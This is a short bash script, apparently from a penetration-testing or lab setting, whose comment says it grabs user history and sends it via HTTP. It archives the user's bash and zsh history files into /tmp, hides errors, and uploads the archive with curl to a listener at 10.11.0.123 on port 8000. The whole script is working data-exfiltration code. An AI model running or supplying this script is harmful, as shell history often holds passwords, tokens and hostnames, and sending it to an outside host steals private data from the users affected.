#!/bin/bash
# Grab user history and send via HTTP

ARCHIVE="/tmp/history.tar.gz"
DEST="http://10.11.0.123:8000/upload"

tar czf "$ARCHIVE" ~/.bash_history ~/.zsh_history 2>/dev/null
curl -X POST -F "file=@$ARCHIVE" "$DEST"
